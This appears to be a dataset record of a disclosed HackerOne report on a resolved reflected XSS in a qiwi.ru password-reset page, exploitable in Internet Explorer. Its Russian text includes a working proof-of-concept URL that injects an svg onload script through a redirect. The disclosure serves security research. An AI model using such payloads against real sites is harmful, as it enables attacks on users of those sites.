---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '38345'
original_report_id: '38345'
title: '[sms.qiwi.ru] XSS via Request-URI'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2014-12-05T18:25:52.848Z'
disclosed_at: '2018-11-18T07:19:27.455Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 16
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [sms.qiwi.ru] XSS via Request-URI

## Metadata

- HackerOne Report ID: 38345
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2018-11-18T07:19:27.455Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Сценарий https://sms.qiwi.ru/bo/reset/ выводит Request-URI без необходимых обработок. Эксплуатация возможно в браузере Internet Explorer через баг перенаправления (Request-URI будет послан без urlencode). 

PoC (IE)
`http://blackfan.ru/x?r=https://sms.qiwi.ru/bo/reset/"><svg/onload=alert(document.domain)>/%252e%252e/%252e%252e/`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
